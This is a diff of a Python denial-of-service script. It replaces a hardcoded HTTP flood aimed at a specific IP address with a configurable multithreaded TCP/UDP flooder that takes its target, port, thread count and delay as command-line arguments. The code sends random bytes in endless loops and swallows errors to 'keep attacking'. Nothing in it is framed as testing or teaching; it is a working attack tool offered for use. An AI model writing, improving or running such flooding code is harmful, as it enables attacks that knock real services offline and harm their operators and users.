@@ -1,29 +1,59 @@
 import socket
 import threading
+import random
+import time
+import sys
 
-target = '176.237.227.182'  #target ip 
-fake_ip = '182.21.20.32' #fake ip
-port = 80 #port
+def flood(target_ip, target_port, protocol, delay):
+    try:
+        if protocol == 'tcp':
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            sock.connect((target_ip, target_port))
+            message = random._urandom(1024)
+            while True:
+                sock.send(message)
+                time.sleep(delay)
+        else:  # udp
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            message = random._urandom(1024)
+            while True:
+                sock.sendto(message, (target_ip, target_port))
+                time.sleep(delay)
+    except KeyboardInterrupt:
+        print("\nAttack stopped by user.")
+        sys.exit(0)
+    except Exception:
+        pass  # Ignore errors and keep attacking
 
-attack_num = 0
+def main():
+    if len(sys.argv) < 5:
+        print(f"Usage: {sys.argv[0]} <target_ip> <target_port> <protocol tcp/udp> <threads> [delay_seconds]")
+        sys.exit(1)
 
-def attack():
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        
-        global attack_num
-        attack_num += 1
-        print(attack_num)
-        
-        s.close()
+    target_ip = sys.argv[1]
+    target_port = int(sys.argv[2])
+    protocol = sys.argv[3].lower()
+    threads = int(sys.argv[4])
+    delay = float(sys.argv[5]) if len(sys.argv) > 5 else 0
 
+    if protocol not in ['tcp', 'udp']:
+        print("Protocol must be 'tcp' or 'udp'")
+        sys.exit(1)
 
+    print(f"Starting {protocol.upper()} flood on {target_ip}:{target_port} with {threads} threads and {delay}s delay.")
 
+    for _ in range(threads):
+        thread = threading.Thread(target=flood, args=(target_ip, target_port, protocol, delay))
+        thread.daemon = True
+        thread.start()
 
-for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.start()
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nAttack stopped. Exiting program.")
+        sys.exit(0)
 
+if __name__ == "__main__":
+    main()
